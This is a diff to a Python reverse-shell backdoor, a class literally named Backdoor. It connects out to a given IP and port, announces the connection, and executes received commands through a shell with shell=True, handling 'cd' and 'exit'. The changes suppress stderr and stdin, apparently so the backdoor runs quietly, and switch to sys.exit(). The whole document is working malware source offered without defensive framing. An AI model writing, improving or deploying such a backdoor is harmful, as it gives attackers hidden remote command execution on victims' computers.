@@ -3,6 +3,7 @@ import socket, subprocess
 import json
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -11,7 +12,8 @@ class Backdoor:
         self.connection.send(json.dumps("\n[+] Connection Established.\n").encode())
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, "wb")
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) #subprocess.DEVNULL will work in windows
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -49,7 +51,7 @@ class Backdoor:
 
                 if received_command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
 
                 elif received_command[0] == "cd" and len(received_command) > 1:
                     command_result = self.change_working_directory_to(received_command[1])
